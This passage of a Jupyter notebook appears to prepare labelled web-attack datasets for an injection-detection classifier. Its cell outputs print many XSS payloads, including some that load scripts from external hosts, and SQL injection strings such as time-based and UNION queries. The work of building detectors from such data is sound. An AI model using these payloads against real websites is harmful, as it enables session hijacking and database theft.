         "<a href=\"http://1113982867/\">crosssitescripting</a>",
         "xss"
        ],
        [
         "20",
         "<a href=\"javascript:document.location='http://www.vulnerability-lab.com/'\">crosssitescripting</a>",
         "xss"
        ],
        [
         "21",
         "<base href=\"javascript:alert('crosssitescripting');//\">",
         "xss"
        ],
        [
         "22",
         "\";alert('crosssitescripting');//",
         "xss"
        ],
        [
         "23",
         "<input type=\"image\" src=\"javascript:alert('crosssitescripting');\">",
         "xss"
        ],
        [
         "24",
         "<crosssitescripting style=\"behavior: url(crosssitescripting.htc);\">",
         "xss"
        ],
        [
         "25",
         "scriptalert(crosssitescripting)/script",
         "xss"
        ],
        [
         "26",
         "<img style=\"crosssitescripting:expr/*crosssitescripting*/ession(alert('crosssitescripting'))\">",
         "xss"
        ],
        [
         "27",
         "<crosssitescripting style=\"crosssitescripting:expression(alert('crosssitescripting'))\"> exp/*<a style='no\\\\crosssitescripting:nocrosssitescripting(\"*//*\"); crosssitescripting:ex/*crosssitescripting*//*/*/pression(alert(\"crosssitescripting\"))'>",
         "xss"
        ],
        [
         "28",
         "<html xmlns:crosssitescripting><?import namespace=\"crosssitescripting\" implementation=\"http://ha.ckers.org/crosssitescripting.htc\"><crosssitescripting:crosssitescripting>crosssitescripting</crosssitescripting:crosssitescripting>",
         "xss"
        ],
        [
         "29",
         "<xml id=i><x><c><![cdata[<img src=\"javas]]><![cdata[cript:alert('crosssitescripting');\">]]>",
         "xss"
        ],
        [
         "30",
         "</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>",
         "xss"
        ],
        [
         "31",
         "<xml id=\"crosssitescripting\"><i><b><img src=\"javas<!-- -->cript:alert('crosssitescripting')\"></b></i></xml>",
         "xss"
        ],
        [
         "32",
         "<span datasrc=\"#crosssitescripting\" datafld=\"b\" dataformatas=\"html\"></span>",
         "xss"
        ],
        [
         "33",
         "<xml src=\"crosssitescriptingtest.xml\" id=i></xml><span datasrc=#i datafld=c dataformatas=html></span>",
         "xss"
        ],
        [
         "34",
         "<?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\">",
         "xss"
        ],
        [
         "35",
         "<?import namespace=\"t\" implementation=\"#default#time2\">",
         "xss"
        ],
        [
         "36",
         "<t:set attributename=\"innerhtml\" to=\"crosssitescripting<script defer>alert(\"crosssitescripting\")</script>\">",
         "xss"
        ],
        [
         "37",
         "</body></html>",
         "xss"
        ],
        [
         "38",
         "<script src=\"http://vulnerability-lab.com/crosssitescripting.jpg\"></script>",
         "xss"
        ],
        [
         "39",
         "<? echo('<scr)';echo('ipt>alert(\"crosssitescripting\")</script>'); ?>",
         "xss"
        ],
        [
         "40",
         "<img src=\"http://www.vulnerability-lab.com/file.php?variables=malicious\">",
         "xss"
        ],
        [
         "41",
         "<iframe src=http://test.de>",
         "xss"
        ],
        [
         "42",
         "<body onload!#$%&()*~+-_.,:;?@[/|\\\\]^`=alert(\"xss\")>",
         "xss"
        ],
        [
         "43",
         "><img id=xss src=x onerror=alert(xss);>",
         "xss"
        ],
        [
         "44",
         ";!--\"<xss>=&{()}\"",
         "xss"
        ],
        [
         "45",
         "<img id=xss src=\"javascript:alert('xss');\">",
         "xss"
        ],
        [
         "46",
         "<img id=xss src=javascript:alert('xss')>",
         "xss"
        ],
        [
         "47",
         "<img id=xss src=javascript:alert(\"xss\")>",
         "xss"
        ],
        [
         "48",
         "<img id=xss src=`javascript:alert(\"'xss'\")`>",
         "xss"
        ],
        [
         "49",
         "<img id=xss src=\"jav ascript:alert('xss');\">",
         "xss"
        ]
       ],
       "shape": {
        "columns": 2,
        "rows": 532
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>payload</th>\n",
       "      <th>xss</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>confirm(2)&gt;/</td>\n",
       "      <td>xss</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>open()&gt;</td>\n",
       "      <td>xss</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>location=?javascript:alert(1)&gt;click</td>\n",
       "      <td>xss</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>&lt;svg&gt;&lt;script&gt;alert(/1/)&lt;/script&gt;</td>\n",
       "      <td>xss</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</td>\n",
       "      <td>xss</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>527</th>\n",
       "      <td>&lt;script a=\"&gt;\" id=xss src=\"http://ha.ckers.org/...</td>\n",
       "      <td>xss</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>528</th>\n",
       "      <td>&lt;script a=\"&gt;\" '' id=xss src=\"http://ha.ckers.o...</td>\n",
       "      <td>xss</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>529</th>\n",
       "      <td>&lt;script \"a='&gt;'\" id=xss src=\"http://ha.ckers.or...</td>\n",
       "      <td>xss</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>530</th>\n",
       "      <td>&lt;script a=`&gt;` id=xss src=\"http://ha.ckers.org/...</td>\n",
       "      <td>xss</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>531</th>\n",
       "      <td>&lt;script&gt;document.write(\"&lt;scri\");&lt;/script&gt;pt id...</td>\n",
       "      <td>xss</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>532 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                               payload  xss\n",
       "0                                         confirm(2)>/  xss\n",
       "1                                              open()>  xss\n",
       "2                  location=?javascript:alert(1)>click  xss\n",
       "3                     <svg><script>alert(/1/)</script>  xss\n",
       "4                   </script><script>alert(1)</script>  xss\n",
       "..                                                 ...  ...\n",
       "527  <script a=\">\" id=xss src=\"http://ha.ckers.org/...  xss\n",
       "528  <script a=\">\" '' id=xss src=\"http://ha.ckers.o...  xss\n",
       "529  <script \"a='>'\" id=xss src=\"http://ha.ckers.or...  xss\n",
       "530  <script a=`>` id=xss src=\"http://ha.ckers.org/...  xss\n",
       "531  <script>document.write(\"<scri\");</script>pt id...  xss\n",
       "\n",
       "[532 rows x 2 columns]"
      ]
     },
     "execution_count": 755,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "xss_pf = xss_pf[[\"payload\", \"attack_type\"]]\n",
    "xss_pf.rename(columns={\"attack_type\": \"xss\"}, inplace=True)\n",
    "xss_pf"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 756,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/var/folders/3h/x3xvrvmn1k739nf02crffq1h0000gn/T/ipykernel_15855/3999991431.py:1: SettingWithCopyWarning: \n",
      "A value is trying to be set on a copy of a slice from a DataFrame.\n",
      "Try using .loc[row_indexer,col_indexer] = value instead\n",
      "\n",
      "See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n",
      "  xss_pf[\"xss\"] = xss_pf[\"xss\"].apply(lambda x: 1 if x == \"xss\" else 0)\n"
     ]
    }
   ],
   "source": [
    "xss_pf[\"xss\"] = xss_pf[\"xss\"].apply(lambda x: 1 if x == \"xss\" else 0)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 757,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "payload",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "xss",
         "rawType": "int64",
         "type": "integer"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "937fc477-76a2-448d-92b2-a51f1177749e",
       "rows": [],
       "shape": {
        "columns": 2,
        "rows": 0
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>payload</th>\n",
       "      <th>xss</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "Empty DataFrame\n",
       "Columns: [payload, xss]\n",
       "Index: []"
      ]
     },
     "execution_count": 757,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "xss_pf[xss_pf[\"xss\"] != 1]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 758,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "payload",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "xss",
         "rawType": "int64",
         "type": "integer"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "7d3a2a07-5063-4ec3-b065-fb4122129561",
       "rows": [
        [
         "0",
         "confirm(2)>/",
         "1"
        ],
        [
         "1",
         "open()>",
         "1"
        ],
        [
         "2",
         "location=?javascript:alert(1)>click",
         "1"
        ],
        [
         "3",
         "<svg><script>alert(/1/)</script>",
         "1"
        ],
        [
         "4",
         "</script><script>alert(1)</script>",
         "1"
        ],
        [
         "5",
         "5rt(0);'>rhainfosec",
         "1"
        ],
        [
         "6",
         ">\"<img src=&{document.cookie=true;};>",
         "1"
        ],
        [
         "7",
         ">\"<img src=\"mocha:document.cookie=true;\">",
         "1"
        ],
        [
         "8",
         ">\"<img src=\"livescript:document.cookie=true;\">",
         "1"
        ],
        [
         "9",
         "\"data:text/html;base64,phnjcmlwdd5hbgvydcgisgvsbg8ikts8l3njcmlwdd4=\">",
         "1"
        ],
        [
         "10",
         "prompt(1);>",
         "1"
        ],
        [
         "11",
         "<body onload!#$%&()*~+-_.,:;?@[/|\\\\]^`=alert(\"crosssitescripting\")>",
         "1"
        ],
        [
         "12",
         "<iframe src=http://vulnerability-lab.com/index.html <",
         "1"
        ],
        [
         "13",
         "<table background=\"javascript:alert('crosssitescripting')\">",
         "1"
        ],
        [
         "14",
         "<table><td background=\"javascript:alert('crosssitescripting')\">",
         "1"
        ],
        [
         "15",
         "<bgsound src=\"javascript:alert('crosssitescripting');\">",
         "1"
        ],
        [
         "16",
         "<br size=\"&{alert('crosssitescripting')}\">",
         "1"
        ],
        [
         "17",
         "<a href=\"http://server.com/\">crosssitescripting</a>",
         "1"
        ],
        [
         "18",
         "<a href=\"http://www.google.com\">crosssitescripting</a>",
         "1"
        ],
        [
         "19",
         "<a href=\"http://1113982867/\">crosssitescripting</a>",
         "1"
        ],
        [
         "20",
         "<a href=\"javascript:document.location='http://www.vulnerability-lab.com/'\">crosssitescripting</a>",
         "1"
        ],
        [
         "21",
         "<base href=\"javascript:alert('crosssitescripting');//\">",
         "1"
        ],
        [
         "22",
         "\";alert('crosssitescripting');//",
         "1"
        ],
        [
         "23",
         "<input type=\"image\" src=\"javascript:alert('crosssitescripting');\">",
         "1"
        ],
        [
         "24",
         "<crosssitescripting style=\"behavior: url(crosssitescripting.htc);\">",
         "1"
        ],
        [
         "25",
         "scriptalert(crosssitescripting)/script",
         "1"
        ],
        [
         "26",
         "<img style=\"crosssitescripting:expr/*crosssitescripting*/ession(alert('crosssitescripting'))\">",
         "1"
        ],
        [
         "27",
         "<crosssitescripting style=\"crosssitescripting:expression(alert('crosssitescripting'))\"> exp/*<a style='no\\\\crosssitescripting:nocrosssitescripting(\"*//*\"); crosssitescripting:ex/*crosssitescripting*//*/*/pression(alert(\"crosssitescripting\"))'>",
         "1"
        ],
        [
         "28",
         "<html xmlns:crosssitescripting><?import namespace=\"crosssitescripting\" implementation=\"http://ha.ckers.org/crosssitescripting.htc\"><crosssitescripting:crosssitescripting>crosssitescripting</crosssitescripting:crosssitescripting>",
         "1"
        ],
        [
         "29",
         "<xml id=i><x><c><![cdata[<img src=\"javas]]><![cdata[cript:alert('crosssitescripting');\">]]>",
         "1"
        ],
        [
         "30",
         "</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>",
         "1"
        ],
        [
         "31",
         "<xml id=\"crosssitescripting\"><i><b><img src=\"javas<!-- -->cript:alert('crosssitescripting')\"></b></i></xml>",
         "1"
        ],
        [
         "32",
         "<span datasrc=\"#crosssitescripting\" datafld=\"b\" dataformatas=\"html\"></span>",
         "1"
        ],
        [
         "33",
         "<xml src=\"crosssitescriptingtest.xml\" id=i></xml><span datasrc=#i datafld=c dataformatas=html></span>",
         "1"
        ],
        [
         "34",
         "<?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\">",
         "1"
        ],
        [
         "35",
         "<?import namespace=\"t\" implementation=\"#default#time2\">",
         "1"
        ],
        [
         "36",
         "<t:set attributename=\"innerhtml\" to=\"crosssitescripting<script defer>alert(\"crosssitescripting\")</script>\">",
         "1"
        ],
        [
         "37",
         "</body></html>",
         "1"
        ],
        [
         "38",
         "<script src=\"http://vulnerability-lab.com/crosssitescripting.jpg\"></script>",
         "1"
        ],
        [
         "39",
         "<? echo('<scr)';echo('ipt>alert(\"crosssitescripting\")</script>'); ?>",
         "1"
        ],
        [
         "40",
         "<img src=\"http://www.vulnerability-lab.com/file.php?variables=malicious\">",
         "1"
        ],
        [
         "41",
         "<iframe src=http://test.de>",
         "1"
        ],
        [
         "42",
         "<body onload!#$%&()*~+-_.,:;?@[/|\\\\]^`=alert(\"xss\")>",
         "1"
        ],
        [
         "43",
         "><img id=xss src=x onerror=alert(xss);>",
         "1"
        ],
        [
         "44",
         ";!--\"<xss>=&{()}\"",
         "1"
        ],
        [
         "45",
         "<img id=xss src=\"javascript:alert('xss');\">",
         "1"
        ],
        [
         "46",
         "<img id=xss src=javascript:alert('xss')>",
         "1"
        ],
        [
         "47",
         "<img id=xss src=javascript:alert(\"xss\")>",
         "1"
        ],
        [
         "48",
         "<img id=xss src=`javascript:alert(\"'xss'\")`>",
         "1"
        ],
        [
         "49",
         "<img id=xss src=\"jav ascript:alert('xss');\">",
         "1"
        ]
       ],
       "shape": {
        "columns": 2,
        "rows": 532
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>payload</th>\n",
       "      <th>xss</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>confirm(2)&gt;/</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>open()&gt;</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>location=?javascript:alert(1)&gt;click</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>&lt;svg&gt;&lt;script&gt;alert(/1/)&lt;/script&gt;</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>527</th>\n",
       "      <td>&lt;script a=\"&gt;\" id=xss src=\"http://ha.ckers.org/...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>528</th>\n",
       "      <td>&lt;script a=\"&gt;\" '' id=xss src=\"http://ha.ckers.o...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>529</th>\n",
       "      <td>&lt;script \"a='&gt;'\" id=xss src=\"http://ha.ckers.or...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>530</th>\n",
       "      <td>&lt;script a=`&gt;` id=xss src=\"http://ha.ckers.org/...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>531</th>\n",
       "      <td>&lt;script&gt;document.write(\"&lt;scri\");&lt;/script&gt;pt id...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>532 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                               payload  xss\n",
       "0                                         confirm(2)>/    1\n",
       "1                                              open()>    1\n",
       "2                  location=?javascript:alert(1)>click    1\n",
       "3                     <svg><script>alert(/1/)</script>    1\n",
       "4                   </script><script>alert(1)</script>    1\n",
       "..                                                 ...  ...\n",
       "527  <script a=\">\" id=xss src=\"http://ha.ckers.org/...    1\n",
       "528  <script a=\">\" '' id=xss src=\"http://ha.ckers.o...    1\n",
       "529  <script \"a='>'\" id=xss src=\"http://ha.ckers.or...    1\n",
       "530  <script a=`>` id=xss src=\"http://ha.ckers.org/...    1\n",
       "531  <script>document.write(\"<scri\");</script>pt id...    1\n",
       "\n",
       "[532 rows x 2 columns]"
      ]
     },
     "execution_count": 758,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "xss_pf"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 759,
   "metadata": {},
   "outputs": [],
   "source": [
    "xss_pf.to_csv(\"../Datasets/Processed/xss_pf.csv\", index=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### SQLInjection_XSS_CommandInjection_MixDataset.1.0.0.csv"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 760,
   "metadata": {},
   "outputs": [],
   "source": [
    "sxcm = pd.read_csv(\"../Datasets/SQLInjection_XSS_CommandInjection_MixDataset.1.0.0.csv\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 761,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "Sentence",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "SQLInjection",
         "rawType": "float64",
         "type": "float"
        },
        {
         "name": "XSS",
         "rawType": "float64",
         "type": "float"
        },
        {
         "name": "CommandInjection",
         "rawType": "float64",
         "type": "float"
        },
        {
         "name": "Normal",
         "rawType": "float64",
         "type": "float"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "748a80cc-55cf-4954-a069-b4a35ab56218",
       "rows": [
        [
         "0",
         "\" or pg_sleep ( __TIME__ ) --",
         "1.0",
         "0.0",
         "0.0",
         "0.0"
        ],
        [
         "1",
         "create user name identified by pass123 temporary tablespace temp default tablespace users; ",
         "1.0",
         "0.0",
         "0.0",
         "0.0"
        ],
        [
         "2",
         "%29",
         "1.0",
         "0.0",
         "0.0",
         "0.0"
        ],
        [
         "3",
         "' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",
         "1.0",
         "0.0",
         "0.0",
         "0.0"
        ],
        [
         "4",
         " select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'",
         "1.0",
         "0.0",
         "0.0",
         "0.0"
        ]
       ],
       "shape": {
        "columns": 5,
        "rows": 5
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Sentence</th>\n",
       "      <th>SQLInjection</th>\n",
       "      <th>XSS</th>\n",
       "      <th>CommandInjection</th>\n",
       "      <th>Normal</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>\" or pg_sleep ( __TIME__ ) --</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>create user name identified by pass123 tempora...</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>%29</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>' AND 1 = utl_inaddr.get_host_address  (  (  S...</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>select * from users where id = '1' or @ @1 = ...</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                            Sentence  SQLInjection  XSS  \\\n",
       "0                      \" or pg_sleep ( __TIME__ ) --           1.0  0.0   \n",
       "1  create user name identified by pass123 tempora...           1.0  0.0   \n",
       "2                                                %29           1.0  0.0   \n",
       "3  ' AND 1 = utl_inaddr.get_host_address  (  (  S...           1.0  0.0   \n",
       "4   select * from users where id = '1' or @ @1 = ...           1.0  0.0   \n",
       "\n",
       "   CommandInjection  Normal  \n",
       "0               0.0     0.0  \n",
       "1               0.0     0.0  \n",
       "2               0.0     0.0  \n",
       "3               0.0     0.0  \n",
       "4               0.0     0.0  "
      ]
     },
     "execution_count": 761,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sxcm.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 762,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'pandas.core.frame.DataFrame'>\n",
      "RangeIndex: 206636 entries, 0 to 206635\n",
      "Data columns (total 5 columns):\n",
      " #   Column            Non-Null Count   Dtype  \n",
      "---  ------            --------------   -----  \n",
      " 0   Sentence          206636 non-null  object \n",
      " 1   SQLInjection      206636 non-null  float64\n",
      " 2   XSS               206636 non-null  float64\n",
      " 3   CommandInjection  206636 non-null  float64\n",
      " 4   Normal            206636 non-null  float64\n",
      "dtypes: float64(4), object(1)\n",
      "memory usage: 7.9+ MB\n"
     ]
    }
   ],
   "source": [
    "sxcm.info()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 763,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Sentence            40799\n",
       "SQLInjection        40799\n",
       "XSS                 40799\n",
       "CommandInjection    40799\n",
       "Normal              40799\n",
       "dtype: int64"
      ]
     },
     "execution_count": 763,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sxcm[sxcm[\"XSS\"] == 1].count()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 764,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "Sentence",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "SQLInjection",
         "rawType": "float64",
         "type": "float"
        },
        {
         "name": "XSS",
         "rawType": "float64",
         "type": "float"
        },
        {
         "name": "CommandInjection",
         "rawType": "float64",
         "type": "float"
        },
        {
         "name": "Normal",
         "rawType": "float64",
         "type": "float"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "b6512ad6-466c-436a-9c0a-325d533a3460",
       "rows": [
        [
         "0",
         "<tt onmouseover=\"alert(1)\">test</tt>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "1",
         "<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "2",
         "<col draggable=\"true\" ondragenter=\"alert(1)\">test</col>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "3",
         "<caption onpointerdown=alert(1)>XSS</caption>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "4",
         "<caption id=x tabindex=1 ondeactivate=alert(1)></caption><input id=y autofocus>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "5",
         "<style onmouseleave=\"alert(1)\">test</style>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "6",
         "<svg><meta onload=alert(1)></meta>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "7",
         "<figcaption onpointerleave=alert(1)>XSS</figcaption>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "8",
         "<datalist id=x tabindex=1 onfocusin=alert(1)></datalist>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "9",
         "<input type=image src=1 onerror=alert(1)>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "10",
         "<strong ondblclick=\"alert(1)\">test</strong>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "11",
         "<div draggable=\"true\" contenteditable>drag me</div><input ondragover=alert(1) contenteditable>drop here</input>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "12",
         "<spacer onkeypress=\"alert(1)\" contenteditable>test</spacer>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "13",
         "<style>@keyframes slidein {}</style><center style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></center>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "14",
         "<pre draggable=\"true\" ondragend=\"alert(1)\">test</pre>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "15",
         "<colgroup onblur=alert(1) tabindex=1 id=x></colgroup><input autofocus>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "16",
         "<style>@keyframes x{}</style><main style=\"animation-name:x\" onanimationstart=\"alert(1)\"></main>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "17",
         "<article draggable=\"true\" ondrag=\"alert(1)\">test</article>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "18",
         "<rtc draggable=\"true\" ondragleave=\"alert(1)\">test</rtc>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "19",
         "<div draggable=\"true\" contenteditable>drag me</div><sup ondrop=alert(1) contenteditable>drop here</sup>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "20",
         "<frame oncut=\"alert(1)\" contenteditable>test</frame>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "21",
         "<frameset onmouseover=\"alert(1)\">test</frameset>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "22",
         "<style>@keyframes x{}</style><nobr style=\"animation-name:x\" onanimationstart=\"alert(1)\"></nobr>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "23",
         "<iframe onload=alert(1)></iframe>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "24",
         "<strong draggable=\"true\" ondragstart=\"alert(1)\">test</strong>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "25",
         "<style>@keyframes x{}</style><h1 style=\"animation-name:x\" onanimationstart=\"alert(1)\"></h1>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "26",
